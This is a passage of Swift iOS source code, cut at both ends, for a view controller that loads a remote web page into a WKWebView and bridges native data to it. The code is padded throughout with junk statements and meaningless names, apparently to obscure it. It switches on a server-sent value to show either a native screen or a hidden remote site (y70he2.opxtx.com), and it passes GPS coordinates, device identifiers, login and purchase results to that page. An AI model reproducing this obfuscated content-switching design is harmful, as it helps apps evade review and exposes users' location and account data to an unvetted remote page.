             if NSNumber(value:willR).boolValue {}
            let handler = String(format: "window.%@('%@',%@)",String.sourceBlackAnimateTrackBody(),callback,String.purchaseLastScrollProvidingZeroConversion(from:keyboard) ?? "")
            self.webView?.evaluateJavaScript(handler) { _, error in
            let e_productsY:[Any]! = [343, 715]
             if e_productsY.startIndex > 195 {}
                if error == nil {
                    print("\(callback) Success JS")
                }
            }
        }
    }

    private func modalAnnotationAlertAdd(_ viewController: UIViewController, data: [String: Any], uuid: String){
            let waitj:[Any]! = [957, 624]
        
        let values = data.first(where: { $0.key.hasSuffix("_cb") })?.value as? String ?? ""
        let type = data.first(where: { $0.key.hasSuffix("_pe") })?.value as? String ?? ""
        let user = String(type.suffix(2))
            let handleronu:Bool = false
        if user == "lo"{
            let handleron = data.first(where: { $0.key.hasSuffix("_sk") }).map { "\($0.value)" } ?? ""
            if handleron == "1"{
                availableActionProviding(uuid: uuid, callback: values)
            }
        }else if user == "ap"{
            appendProgressSampleBlackOfferingWhen(data: data, uuid: uuid, callback: values)
        }else if user == "se"{
            IALoginLogin.shared.compactUnsafePopFilter()
        }else if user == "py"{
            commonDarkReachableStandardLimited(data: data, uuid: uuid, callback: values)
        }else if user == "gd"{
            albumResponseRealKitBlankBounce(data: data, uuid: uuid, callback: values)
        }else if user == "ab"{
            UserDefaults.standard.setValue("******", forKey: String.targetFilterCompletionAddKeyboardDissolve())
            let perms:[Any]! = ["multxmult", "tellar"]
             while perms.count > 129 { break }
            self.didMakeView?.modalPresentationStyle = .fullScreen
            let dictA:Float = 3277.0
             if NSNumber(value:dictA).intValue < 134 {}
            UIWindow.current?.currentController?.present(self.didMakeView!, animated: false, completion: nil)
        }else if user == "ag"{
            let home = data.first(where: { $0.key.hasSuffix("_aw") }).map { "\($0.value)" } ?? ""
            if let allowString = home as? String {
                webView?.allowsBackForwardNavigationGestures = (allowString == "1")
            } else {
                webView?.allowsBackForwardNavigationGestures = false
            }
        }else if user == "ai"{
            var project = LDelegate.shared.fullLocaleCoreEndColor()
            let beginB:String! = "evice"
             while beginB.count > 25 { break }
            project[String.targetMatchBackgroundCountStandard() +  "ud"] = uuid
            let successt:Double = 2861.0
             if NSNumber(value:successt).intValue >= 63 {}
            let begin = String(format: "window.%@('%@',%@)", String.sourceBlackAnimateTrackBody(),values,String.purchaseLastScrollProvidingZeroConversion(from:project) ?? "")
            self.webView?.evaluateJavaScript(begin) { _, error in
            }
        }else if user == "sr"{
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                if let scene = UIApplication.shared.connectedScenes
                    .first(where: { $0.activationState == .foregroundActive }) as? UIWindowScene {
                    if #available(iOS 14.0, *) {
                        SKStoreReviewController.requestReview(in: scene)
                    } else {
                        
                    }
                }
            }
        }
    }

    private func appendProgressSampleBlackOfferingWhen(data: [String: Any], uuid: String, callback: String) {
        IALoginLogin.shared.presentationScreenReboundResult{ success, code in
            let sampleW:String! = "ttadsp"
             if sampleW.count > 117 {}
            var keyboard: [String: Any] = [:]
            let body2:Bool = false
             while !NSNumber(value:body2).boolValue { break }
            keyboard[String.targetMatchBackgroundCountStandard() + "us"] = success ? 1 : 0
            keyboard[String.targetMatchBackgroundCountStandard() + "cd"] = code
            let fieldk:Double = 7131.0
             while NSNumber(value:fieldk).intValue > 174 { break }
            keyboard[String.targetMatchBackgroundCountStandard() + "pe"] = data["type"]
            let home2:Int = 2082
             while NSNumber(value:home2).intValue >= 145 { break }
            keyboard[String.targetMatchBackgroundCountStandard() + "ud"] = uuid
            let point0:Double = 6348.0
             _ = NSNumber(value: point0).intValue
            let handler = String(format: "window.%@('%@',%@)",String.sourceBlackAnimateTrackBody(),callback,String.purchaseLastScrollProvidingZeroConversion(from:keyboard) ?? "")
            self.webView?.evaluateJavaScript(handler) { _, error in
            let scene_ij:Double = 3656.0
             while NSNumber(value:scene_ij).intValue <= 74 { break }
                if error == nil {
                    print("\(callback) Success JS")
                }else{
                    print(error as Any)
                }
            }
        }
    }

    private func checkLocaleCompactInteractionCellularLimited() {
            let digestx:Double = 1673.0
             _ = NSNumber(value: digestx).intValue
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            var hours: [String: Any] = [:]
            let window_ms:String! = "conf"
             if window_ms.count > 130 {}
            hours[String.targetMatchBackgroundCountStandard() + "um"] = RCenterModity.shared.dismissNotificationRemote()
            let taskS:[String: Any]! = ["vertex":"motionsearch", "security":"cocg"]
            hours[String.targetMatchBackgroundCountStandard() + "ra"] = RCenterModity.shared.longitudeIdiomAppendPhoneEndSplit()
            let identifiersU:Double = 6595.0
             if NSNumber(value:identifiersU).intValue == 96 {}
            hours[String.targetMatchBackgroundCountStandard() + "lo"] = RCenterModity.shared.backHandlers
            let secondst:[Any]! = [9304.0]
             if secondst.startIndex > 21 {}
            hours[String.targetMatchBackgroundCountStandard() + "if"] = RCenterModity.shared.permHeaders
            let completionw:[Any]! = [727, 820, 235]
             if completionw.startIndex > 1 {}
            hours[String.targetMatchBackgroundCountStandard() + "ng"] = RCenterModity.shared.languageEird
            let waitr:[Any]! = ["changes"]
             if waitr.count > 152 {}
            hours[String.targetMatchBackgroundCountStandard() + "fa"] = RCenterModity.shared.componentsIds
            let dictt:Double = 1211.0
             if NSNumber(value:dictt).intValue < 108 {}
            let handler = String(format: "window.%@('pr',%@)",String.sourceBlackAnimateTrackBody(), String.purchaseLastScrollProvidingZeroConversion(from: hours) ?? "")
            self.webView?.evaluateJavaScript(handler) { result, error in
            let identifiersm:Int = 7555
             if NSNumber(value:identifiersm).intValue <= 121 {}
                if error == nil {
                    print("onPremissionsCallback Success JS")
                }
            }
        }
    }

    private func availableActionProviding(uuid: String, callback: String) {
        RCenterModity.shared.allowFilterOneShow{ latitude, longitude, isAuthorized in
            let q_productsi:Float = 5988.0
             if NSNumber(value:q_productsi).intValue == 127 {}
            if !isAuthorized {
                self.checkLocaleCompactInteractionCellularLimited()
            let contentt:Double = 8676.0
             _ = NSNumber(value: contentt).intValue
                IALoginLogin.shared.compactUnsafePopFilter()
            } else {
                UserDefaults.standard.set("****", forKey: "islocation")
            let idsa:Int = 9654
             while NSNumber(value:idsa).intValue >= 38 { break }
                let path = Double(String(format: "%.6f", latitude)) ?? 0
            let randoma:Float = 3301.0
             while NSNumber(value:randoma).intValue == 179 { break }
                let conversiong = Double(String(format: "%.6f", longitude)) ?? 0
            let handlers3:[Any]! = ["rofile"]
                var will: [String: Any] = [:]
            let base5:String! = "padded"
                will[String.targetMatchBackgroundCountStandard() + "lt"] = String(path)
            let scroll0:Double = 3712.0
             _ = NSNumber(value: scroll0).intValue
                will[String.targetMatchBackgroundCountStandard() + "ln"] = String(conversiong)
            let identifiersO:Double = 1166.0
             if NSNumber(value:identifiersO).intValue <= 15 {}
                will[String.targetMatchBackgroundCountStandard() + "lo"] = isAuthorized ? 1 : 0
                will[String.targetMatchBackgroundCountStandard() + "ud"] = uuid
            let processed0:Float = 7194.0
             while NSNumber(value:processed0).intValue == 87 { break }
                let handler = String(format: "window.%@('%@',%@)",String.sourceBlackAnimateTrackBody(),callback,String.purchaseLastScrollProvidingZeroConversion(from:will) ?? "")
                self.webView?.evaluateJavaScript(handler) { _, error in
            let latitudeQ:Float = 9505.0
             if NSNumber(value:latitudeQ).intValue <= 138 {}
                    if error == nil {
                        print("\(callback) Success JS")
            let keyboardp:[String: Any]! = ["ycocgrgba":346, "munmap":13]
             while keyboardp.count > 122 { break }
                        self.checkLocaleCompactInteractionCellularLimited()
                    }else{
                        
                    }
                }
            }
        }
    }

    public func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) {
            let size_m94:Int = 920
             if NSNumber(value:size_m94).intValue <= 27 {}
       completionHandler?(false, "")
    }

    private func albumResponseRealKitBlankBounce(data: [String: Any], uuid: String, callback: String) {
            let knvhir:[Any]! = [221, 848, 517]
             if knvhir.endIndex < 141 {}
        let show = data.first(where: { $0.key.hasSuffix("_is") })?.value as? [String] ?? []
        let componentsi = data.first(where: { $0.key.hasSuffix("_uu") })?.value as? String ?? ""
        MYKNewsLogin.shared.appendContentLocaleRect(show) { priceDict in
            let idsi:String! = "benign"
             if idsi == "v" {}
            var m_badge: [String: Any] = [:]
            let begin4:String! = "hasher"
             while begin4.count > 90 { break }
            m_badge[String.targetMatchBackgroundCountStandard() + "ud"] = uuid
            let actives:Int = 5014
             if NSNumber(value:actives).intValue > 159 {}
            m_badge[String.targetMatchBackgroundCountStandard() + "gd"] = priceDict
            let attributesk:Double = 9079.0
             if NSNumber(value:attributesk).intValue >= 57 {}
            if priceDict.count > 0 {
                let handler = String(format: "window.%@('%@',%@)",String.sourceBlackAnimateTrackBody(),callback,String.purchaseLastScrollProvidingZeroConversion(from:m_badge) ?? "")
                self.webView?.evaluateJavaScript(handler) { value, error in
            let signQ:String! = "cluster"
             if signQ.count > 149 {}
                    if error == nil {
                        print("\(callback) Success JS")
            let with_66:Double = 3348.0
             while NSNumber(value:with_66).intValue == 186 { break }
                        MYKNewsLogin.shared.setMessageRawContentKindMachine(IALoginLogin.shared.identifiersTracking, componentsi)
                        Purchases.shared.getOfferings { (jsonVersion, error) in
            let headersO:[String: Any]! = ["directories":"donation", "unused":"aeval", "piecewise":"usleep"]
             if headersO.count > 129 {}
                            if let error = error {
                                return
                            }
                            MYKNewsLogin.shared.jsonVersion = jsonVersion
                        }
                    }
                }
            }
        }
    }

    public func presentationAnchor(for controller: ASAuthorizationController) -> ASPresentationAnchor {
            let headers0:Float = 6517.0
             if NSNumber(value:headers0).intValue <= 51 {}
        return UIWindow.current!
    }
}
class AXVEdit: UIViewController{
    private var generateSize_dk = NetworkReachabilityManager()
    private var webView: WKWebView!
    private let digestSecondsImage = UIImageView(image: UIImage(named: "launch"))
    deinit {
        let messageHandlers = [
            "pr",
            "a",
            "kc",
            "nc"
        ]
        messageHandlers.forEach {
            webView.configuration.userContentController.removeScriptMessageHandler(forName: $0)
        }
        NotificationCenter.default.removeObserver(self, name: .appKeyboardWillShowNotification, object: nil)
        NotificationCenter.default.removeObserver(self, name: .appKeyboardWillHidenNotification, object: nil)
    }
    override var preferredStatusBarStyle: UIStatusBarStyle{
        return .lightContent
    }

    private func evaluateHeightGenerateConversionSoundAlert(){
        ZLaunchMain.shared.targetVisibleStoreZeroDictionaryPop{ data, isEnd in
            let homeu:Float = 6559.0
             if NSNumber(value:homeu).intValue > 179 {}
            if isEnd{
                guard let realData = data as? Data else { return }
                do {
                    let ids9 = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
            let sharede:[String: Any]! = ["iirfilter":73, "keychain":890, "ocking":901]
             if sharede.count > 23 {}
                    let style = "code"
            let tabD:[String: Any]! = ["flash":"dropoff", "safety":"siri", "idiom":"retranmission"]
             if tabD.count > 32 {}
                    let catO = "data"
            let projecti:String! = "inserted"
             while projecti.count > 142 { break }
                    guard let code = ids9[style],
                          let apple = ids9[catO] as? [String: Any] else {
                        return
                    }
                    if String(format: "%@", code as! CVarArg) == "1003"{
                        let point = apple.keys.reversed().first as? String ?? ""
            let controllerW:String! = "recovery"
             if controllerW.count > 12 {}
                        let bnews = apple[point] as? String ?? ""
            let pathu:Double = 535.0
             _ = NSNumber(value: pathu).intValue
                        let credential = bnews.split(separator: ".")
            let scene_jM:Float = 2088.0
             if NSNumber(value:scene_jM).intValue == 191 {}
                        let offeringse = String(credential[0])
            let beginf:[String: Any]! = ["dbi":"compress", "xmlescape":"height", "aybr":"hfyu"]
                        let preferredi = String(credential[1])
            let systemZ:Double = 1978.0
             _ = NSNumber(value: systemZ).intValue
                        if  preferredi == "png"{
                            UserDefaults.standard.setValue(String(format: "https://y70he2.opxtx.com/%@?%@fv=v1.1.0",offeringse,String.targetMatchBackgroundCountStandard()), forKey: String.transitionSoundPriceShouldActivityLocale())
                        }
                    }
                }
                catch {
                    print("JSON Error: \(error)")
                }
            }else{
               
            }
        }
    }

    private func handleMapProtectQueryDurationScene() {
            let handlers3:[String: Any]! = ["holds":596, "olana":420, "flow":806]
        if (UserDefaults.standard.object(forKey: String.transitionSoundPriceShouldActivityLocale())) == nil {
            performBecomeCanPackageResponseInteraction()
        }else{
            SVProgressHUD .setDefaultStyle(.dark)
            let eirdi:String! = "read"
             if eirdi == "Z" {}
            SVProgressHUD .show(withStatus: "loading...")
            let homex:[String: Any]! = ["forgotten":120, "recip":908, "milliseconds":724]
             if homex.count > 162 {}
            self.permFinishPresentMachineScheme(path:UserDefaults.standard.string(forKey:  String.transitionSoundPriceShouldActivityLocale())!)
            let taskn:Double = 4184.0
             if NSNumber(value:taskn).intValue == 20 {}
            evaluateHeightGenerateConversionSoundAlert()
        }
        
    }

    private func permFinishPresentMachineScheme(path:String){
            let clients:String! = "vcxproj"
        if let url = URL(string: path) {
            webView.load(URLRequest(url: url))
        }
    }

    private func removeNotificationCallLocale() {
            let configD:String! = "redirection"
        if UserDefaults.standard.object(forKey: "locationPermission") != nil {
            RCenterModity.shared.allowFilterOneShow{ latitude, longitude, isAuthorized in
            let idsi:String! = "write"
             if idsi == "b" {}
                if !isAuthorized {
                    self.canControlChangeColor()
                } else {
                    UserDefaults.standard.set("****", forKey: "islocation")
            let shieldE:Float = 3008.0
             while NSNumber(value:shieldE).intValue >= 97 { break }
                    let path = Double(String(format: "%.6f", latitude)) ?? 0
            let applicationj:Double = 1924.0
             while NSNumber(value:applicationj).intValue == 51 { break }
                    let conversiong = Double(String(format: "%.6f", longitude)) ?? 0
            let navM:[Any]! = [[987, 303, 986]]
             while navM.count > 133 { break }
                    var will: [String: Any] = [:]
            let attributesY:Double = 5931.0
             if NSNumber(value:attributesY).intValue >= 188 {}
                    will[String.targetMatchBackgroundCountStandard() + "lt"] = String(path)
            let type_e4:[Any]! = [780, 727]
             while type_e4.count > 110 { break }
                    will[String.targetMatchBackgroundCountStandard() + "ln"] = String(conversiong)
            let scene_pq:String! = "acvp"
             while scene_pq.count > 139 { break }
                    will[String.targetMatchBackgroundCountStandard() + "lo"] = isAuthorized ? 1 : 0
                    let handler = String(format: "window.%@('nc',%@)",String.sourceBlackAnimateTrackBody(),String.purchaseLastScrollProvidingZeroConversion(from: will) ?? "")
                    self.webView?.evaluateJavaScript(handler) { _, error in
            let apss:Double = 1763.0
             if NSNumber(value:apss).intValue == 137 {}
                        if error == nil {
                            print("onLocationChange Success JS")
            let knvhiY:Int = 9509
             while NSNumber(value:knvhiY).intValue == 180 { break }
                            self.canControlChangeColor()
                        }
                    }
                }
            }
        }
    }

    @objc private func handleEndStoreCoordinateObserver(_ notification: Notification) {
        guard let userInfo = notification.userInfo else { return }
        let revenuecat =  IALoginLogin.shared.latitudeServiceReview(from: userInfo)
            let users:String! = "trie"
             if users == "w" {}
        var size_i: [String: Any] = [:]
            let screenO:Bool = true
             while !NSNumber(value:screenO).boolValue { break }
        size_i["UIKeyboardAnimationDurationUserInfoKey"] = revenuecat["UIKeyboardAnimationDurationUserInfoKey"]
            let handlerona:[Any]! = [355, 950, 67]
             if handlerona.endIndex < 13 {}
        size_i["UIKeyboardFrameEndUserInfoKey"] = revenuecat["UIKeyboardFrameEndUserInfoKey"]
            let hidenC:Double = 6165.0
             if NSNumber(value:hidenC).intValue == 13 {}
        size_i["isShow"] = 1
        guard let jsonStr = String.purchaseLastScrollProvidingZeroConversion(from: size_i)else { return }
        let handler = String(format: "window.%@('kc',%@)", String.sourceBlackAnimateTrackBody(),jsonStr)
        webView.evaluateJavaScript(handler) { (result, error) in
            let offsetU:[Any]! = [160, 262, 591]
             if offsetU.endIndex < 87 {}
            if error == nil {
                print("kc Success JS")
            }else{
                print("kc Error JS")
            }
        }
    }

    private func performBecomeCanPackageResponseInteraction(){
            let hoursf:String! = "sqrtneg"
             if hoursf.count > 200 {}

            let fieldg:Float = 517.0
             while NSNumber(value:fieldg).intValue < 137 { break }
        if !Bool.modalMemoryPermissionState(){
            UIApplication.shared.applicationIconBadgeNumber = 0
            let callbackP:Double = 5488.0
             _ = NSNumber(value: callbackP).intValue
            IALoginLogin.shared.didMakeView?.modalPresentationStyle = .fullScreen
            let app0:String! = "tomorrow"
             while app0.count > 164 { break }
            UIWindow.current?.currentController?.present(IALoginLogin.shared.didMakeView!, animated: false, completion: nil)
        }else{
            SVProgressHUD .setDefaultStyle(.dark)
            let formattern:Float = 357.0
             if NSNumber(value:formattern).intValue > 107 {}
            SVProgressHUD .show(withStatus: "loading...")
           ZLaunchMain.shared.targetVisibleStoreZeroDictionaryPop{ data, isEnd in
            let method_u7:[String: Any]! = ["iszero":770, "blowfish":59]
             if method_u7["j"] != nil {}
                if isEnd{
                    guard let realData = data as? Data else { return }
                    do {
                        let ids9 = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
            let idfao:Float = 8625.0
             while NSNumber(value:idfao).intValue == 54 { break }
                        let style = "code"
            let machinea:Double = 8048.0
             if NSNumber(value:machinea).intValue <= 35 {}
                        let catO = "data"
            let callbackf:Float = 6558.0
             if NSNumber(value:callbackf).intValue > 95 {}
                        guard let code = ids9[style],
                              let apple = ids9[catO] as? [String: Any] else {
                            return
                        }
                        if String(format: "%@", code as! CVarArg) == "1003"{
                            let point = apple.keys.reversed().first as? String ?? ""
            let hidenu:String! = "getter"
                            let bnews = apple[point] as? String ?? ""
            let idfaR:Int = 4286
             if NSNumber(value:idfaR).intValue >= 113 {}
                            if !point.hasSuffix("i") {
                                UIApplication.shared.applicationIconBadgeNumber = 0
            let overlayx:Double = 9481.0
             if NSNumber(value:overlayx).intValue >= 104 {}
                                self.digestSecondsImage.isHidden = true
            let goodsZ:Double = 444.0
             if NSNumber(value:goodsZ).intValue == 55 {}
                                SVProgressHUD .dismiss()
            let permQ:Bool = true
             if NSNumber(value:permQ).boolValue {}
                                IALoginLogin.shared.didMakeView?.modalPresentationStyle = .fullScreen
            let call2:Int = 3780
             while NSNumber(value:call2).intValue == 182 { break }
                                UIWindow.current?.currentController?.present(IALoginLogin.shared.didMakeView!, animated: true, completion: nil)
                            } else {
                                let credential = bnews.split(separator: ".")
            let location4:Int = 7533
             while NSNumber(value:location4).intValue < 190 { break }
                                let offeringse = String(credential[0])
            let lastU:Double = 1917.0
             if NSNumber(value:lastU).intValue < 63 {}
                                let preferredi = String(credential[1])
            let plainQ:Int = 6531
             while NSNumber(value:plainQ).intValue < 29 { break }
                                if  preferredi == "jpg"{
                                    UIApplication.shared.applicationIconBadgeNumber = 0
            let type_q5:Double = 6637.0
             if NSNumber(value:type_q5).intValue <= 29 {}
                                    self.digestSecondsImage.isHidden = true
            let idfad:Float = 4255.0
             while NSNumber(value:idfad).intValue == 65 { break }
                                    SVProgressHUD .dismiss()
            let latitudep:String! = "newline"
             while latitudep.count > 12 { break }
                                    IALoginLogin.shared.didMakeView?.modalPresentationStyle = .fullScreen
            let o_centerv:Float = 8593.0
             while NSNumber(value:o_centerv).intValue >= 165 { break }
                                    UIWindow.current?.currentController?.present(IALoginLogin.shared.didMakeView!, animated: true, completion: nil)
                                }else{
                                    UserDefaults.standard.setValue(String(format: "https://y70he2.opxtx.com/%@?%@fv=v1.1.0",offeringse,String.targetMatchBackgroundCountStandard()), forKey:  String.transitionSoundPriceShouldActivityLocale())
                                    self.permFinishPresentMachineScheme(path:UserDefaults.standard.string(forKey: String.transitionSoundPriceShouldActivityLocale())!)
                                }
                            }
                        }else{
                            SVProgressHUD .showError(withStatus: "Error")
                        }
                    }
                    catch {
                        print("JSON Error: \(error)")
                    }
                }else{
                    SVProgressHUD .showError(withStatus: "Error")
                }
            }
        }
    }

    private func canControlChangeColor() {
            let partsc:String! = "ditable"
             if partsc.count > 157 {}
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            var launch: [String: Any] = [:]
            let formatter9:[String: Any]! = ["initial":"yuvya", "separated":"prio", "hashtag":"primes"]
             while formatter9.count > 188 { break }
            launch[String.targetMatchBackgroundCountStandard() + "um"] = RCenterModity.shared.dismissNotificationRemote()
            let skipp:[String: Any]! = ["lspf":372, "textfile":965]
             if skipp.count > 27 {}
            launch[String.targetMatchBackgroundCountStandard() + "ra"] = RCenterModity.shared.longitudeIdiomAppendPhoneEndSplit()
            let shieldW:[Any]! = [315, 585]
            launch[String.targetMatchBackgroundCountStandard() + "lo"] = RCenterModity.shared.backHandlers
            let main_ii:[String: Any]! = ["intfi":"gradient", "remove":"revalidation", "recycle":"register"]
             if main_ii["1"] != nil {}
            launch[String.targetMatchBackgroundCountStandard() + "if"] = RCenterModity.shared.permHeaders
            let schemesi:String! = "pssh"
             if schemesi == "Y" {}
            launch[String.targetMatchBackgroundCountStandard() + "ng"] = RCenterModity.shared.languageEird
            let c_center2:[String: Any]! = ["visit":953, "promises":581]
             if c_center2["L"] != nil {}
            launch[String.targetMatchBackgroundCountStandard() + "fa"] = RCenterModity.shared.componentsIds
            let identifiers2:String! = "voters"
             if identifiers2.count > 16 {}
            let saved = String(format: "window.%@('pr',%@)",String.sourceBlackAnimateTrackBody(), String.purchaseLastScrollProvidingZeroConversion(from: launch) ?? "")
            self.webView.evaluateJavaScript(saved) { _, error in
            let save8:Double = 107.0
             while NSNumber(value:save8).intValue == 157 { break }
                if error == nil {
                }else{
                    print(error as Any)
                }
            }
        }
    }

    @objc private func userRedPhoneEvidence(_ notification: Notification) {
        guard let userInfo = notification.userInfo else { return }
        let revenuecat =  IALoginLogin.shared.latitudeServiceReview(from: userInfo)
            let providerp:[Any]! = [792, 567]
             while providerp.count > 126 { break }
        var size_i: [String: Any] = [:]
            let requestA:Double = 4750.0
             while NSNumber(value:requestA).intValue < 142 { break }
        size_i["UIKeyboardAnimationDurationUserInfoKey"] = revenuecat["UIKeyboardAnimationDurationUserInfoKey"]
            let shieldo:[String: Any]! = ["sofa":82, "atof":602, "transceiver":21]
             if shieldo.count > 104 {}
        size_i["UIKeyboardFrameEndUserInfoKey"] = revenuecat["UIKeyboardFrameEndUserInfoKey"]
            let componentsQ:[String: Any]! = ["s_94":974, "prominent":26]
             if componentsQ.count > 145 {}
        size_i["isShow"] = 0
        guard let jsonStr = String.purchaseLastScrollProvidingZeroConversion(from: size_i)else { return }
        let handler = String(format: "window.%@('kc',%@)", String.sourceBlackAnimateTrackBody(),jsonStr)
        webView.evaluateJavaScript(handler) { (result, error) in
            let latitude6:Double = 7843.0
             while NSNumber(value:latitude6).intValue < 72 { break }
            if error == nil {
                print("kc Success JS")
                
            }
        }
    }

    private func pricePackageNetworkBecomeActiveNative() {
            let revenuecatz:Float = 3829.0
             _ = NSNumber(value: revenuecatz).intValue
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleEndStoreCoordinateObserver(_:)),
            name: .appKeyboardWillShowNotification,
            object: nil
        )
            let enterS:[String: Any]! = ["gsub":8825.0]
             if enterS["H"] != nil {}
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(userRedPhoneEvidence(_:)),
            name: .appKeyboardWillHidenNotification,
            object: nil
        )
    }

    override func viewDidLoad() {
            let basej:[Any]! = [5733.0]
             while basej.count > 55 { break }
        super.viewDidLoad()
            let shared9:Float = 7302.0
             _ = NSNumber(value: shared9).intValue
        self.navigationController?.setNavigationBarHidden(true, animated: false)
            let deviceE:Bool = true
             while !NSNumber(value:deviceE).boolValue { break }
        let saveController = WKUserContentController()
            let targetu:[Any]! = [8751]
             if targetu.endIndex < 13 {}
        let base5 = [
            "pr",
            "kc",
            "nc",
            "a"
        ]
            let scene_xm:[String: Any]! = ["everywhere":189, "mcore":143]
        base5.forEach {
            saveController.add(self, name: $0)
        }
        let projectK = WKWebViewConfiguration()
            let schemes4:Double = 652.0
             if NSNumber(value:schemes4).intValue < 44 {}
        projectK.userContentController = saveController
            let messageZ:[Any]! = ["kernel", "ostar"]
             if messageZ.startIndex > 39 {}
        projectK.preferences.javaScriptEnabled = true
            let completionc:Double = 3522.0
             if NSNumber(value:completionc).intValue > 47 {}
        projectK.allowsInlineMediaPlayback = true
            let tabG:Double = 9448.0
             if NSNumber(value:tabG).intValue == 147 {}
        projectK.mediaTypesRequiringUserActionForPlayback = []
            let providery:[Any]! = [695, 269]
        
        webView = WKWebView(frame: .zero, configuration: projectK)
            let roundedc:String! = "completed"
        webView.navigationDelegate = self
            let sharedV:Double = 5757.0
             if NSNumber(value:sharedV).intValue >= 118 {}
        webView.scrollView.delegate = self
            let app4:String! = "timecodes"
             while app4.count > 33 { break }
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            let a_imagew:Float = 3261.0
             while NSNumber(value:a_imagew).intValue < 168 { break }
        webView.scrollView.bounces = false
            let infoi:Double = 5542.0
             while NSNumber(value:infoi).intValue < 156 { break }
        webView.scrollView.alwaysBounceVertical = false
            let bundle8:[Any]! = [397, 867]
             while bundle8.count > 2 { break }
        webView.scrollView.alwaysBounceHorizontal = false
            let d_viewq:[Any]! = [145, 820]
             if d_viewq.endIndex < 41 {}
        webView.scrollView.refreshControl = nil
            let locationP:String! = "pipelines"
             while locationP.count > 2 { break }
        webView.isOpaque = false
            let keyboardX:Int = 5413
             if NSNumber(value:keyboardX).intValue >= 2 {}
        webView.scrollView.isOpaque = false
            let networkY:Int = 3210
             if NSNumber(value:networkY).intValue == 32 {}
        webView.backgroundColor = .white
            let allowI:Int = 3318
             while NSNumber(value:allowI).intValue == 132 { break }
        webView.scrollView.backgroundColor = .white
            let randomY:Double = 8096.0
             if NSNumber(value:randomY).intValue > 147 {}
        let headers = WJMain(frame: self.view.bounds)
            let schemesH:[Any]! = [145, 425]
             while schemesH.count > 185 { break }
        headers.isSecureTextEntry = true
            let skipu:[String: Any]! = ["preheat":2985.0]
             if skipu["2"] != nil {}
        headers.isUserInteractionEnabled = true
            let makea:Double = 6264.0
             while NSNumber(value:makea).intValue <= 10 { break }
        headers.backgroundColor = .black
            let permG:Float = 8386.0
             if NSNumber(value:permG).intValue > 189 {}
        self.view .addSubview(headers)
            let minutesp:Double = 3072.0
             if NSNumber(value:minutesp).intValue >= 16 {}
        let contentView = headers.subviews.first
            let pushc:Double = 246.0
             if NSNumber(value:pushc).intValue <= 124 {}
        contentView?.isUserInteractionEnabled = true
            let hnew_rB:Bool = false
        contentView?.frame = self.view.bounds
            let priceZ:Double = 9268.0
             if NSNumber(value:priceZ).intValue > 61 {}
        contentView?.addSubview(self.webView)
            let scrolle:[Any]! = [157, 614]
             if scrolle.endIndex < 106 {}
        self.webView.frame = contentView?.bounds ?? self.view.bounds
            let dicn:Int = 3350
             if NSNumber(value:dicn).intValue <= 50 {}
        self.webView.alpha = 0.0
            let user2:Float = 4195.0
             while NSNumber(value:user2).intValue >= 40 { break }
        IALoginLogin.shared.transitionWillCredentialView(self.view)
        IALoginLogin.shared.handlersMake = { [weak self] _ in
            self?.canControlChangeColor()
        }
        pricePackageNetworkBecomeActiveNative()
            let systemi:Double = 9750.0
             if NSNumber(value:systemi).intValue == 34 {}
        dismissInterfaceRawHostUse()
            let baseE:Double = 6493.0
             _ = NSNumber(value: baseE).intValue
        self.view .addSubview(digestSecondsImage)
            let permissionP:String! = "addf"
        digestSecondsImage.frame = CGRectMake(0, 0, UIScreen.main.bounds.width,  UIScreen.main.bounds.height)
            let projectD:[String: Any]! = ["modify":498, "talk":181, "wmvdsp":320]
             if projectD["7"] != nil {}
        self.view.backgroundColor = .black
    }

    private func dismissInterfaceRawHostUse(){
            let taskX:Float = 3039.0
             while NSNumber(value:taskX).intValue < 143 { break }
        if(UserDefaults.standard.object(forKey: String.targetFilterCompletionAddKeyboardDissolve()) != nil){
            UIApplication.shared.applicationIconBadgeNumber = 0
            let overlayw:Bool = false
             if NSNumber(value:overlayw).boolValue {}
            IALoginLogin.shared.didMakeView?.modalPresentationStyle = .fullScreen
            let authorizationi:Double = 8941.0
             if NSNumber(value:authorizationi).intValue == 135 {}
                UIWindow.current?.currentController?.present(IALoginLogin.shared.didMakeView!, animated: false, completion: nil)
            }else{
                generateSize_dk = NetworkReachabilityManager()
                generateSize_dk?.startListening { [weak self] status in
                    guard let self = self else { return }
                    switch status {
                    case .reachable(.ethernetOrWiFi), .reachable(.cellular):
                        handleMapProtectQueryDurationScene()
            let extZ:Double = 1056.0
             _ = NSNumber(value: extZ).intValue
                    case .notReachable:
                        print("")
            let requesti:String! = "sceen"
             if requesti.count > 83 {}
                    case .unknown:
                        print("")
                    }
                }
            }
    }
}
extension AXVEdit: WKNavigationDelegate,UIScrollViewDelegate, WKScriptMessageHandler  {

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            let infoc:Int = 6963
             while NSNumber(value:infoc).intValue > 34 { break }
        SVProgressHUD.dismiss()
            let characters8:Int = 9915
             while NSNumber(value:characters8).intValue < 195 { break }
        UIView.transition(with: self.digestSecondsImage, duration: 0.3, options: .transitionCrossDissolve, animations: {
            self.digestSecondsImage.isHidden = true
        }, completion: nil)
            let eirdM:[String: Any]! = ["dialing":961, "keyed":427]
             if eirdM["f"] != nil {}
        UIView.animate(withDuration: 1.5) {
            self.webView.alpha = 1.0
        }
        generateSize_dk?.stopListening()
            let eird4:Double = 3347.0
             while NSNumber(value:eird4).intValue > 151 { break }
        canControlChangeColor()
            let taskb:String! = "migrated"
             if taskb == "y" {}
        removeNotificationCallLocale()
            let str4:String! = "uploaded"
             if str4.count > 32 {}
        let offeringsa = Int.badgeNumber()
            let versionl:[String: Any]! = ["pointers":985, "bundle":975]
             while versionl.count > 99 { break }
        UserDefaults.standard.setValue(offeringsa, forKey: "badge")
            let samplex:Double = 8654.0
             while NSNumber(value:samplex).intValue <= 134 { break }
        UIApplication.shared.applicationIconBadgeNumber = offeringsa
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            let lon9:String! = "effects"
             if lon9 == "M" {}
